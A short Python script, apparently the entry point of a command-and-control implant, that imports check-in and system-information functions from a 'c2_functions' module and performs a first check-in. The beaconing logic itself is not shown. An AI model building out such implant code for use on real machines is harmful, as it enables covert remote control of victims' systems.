from functions.c2_functions import get_sysinfo, first_checkin

def c2():
    first_response = first_checkin()

    if not first_response:
        print("Failed?")
        return
    
if __name__ == "__main__":
    c2()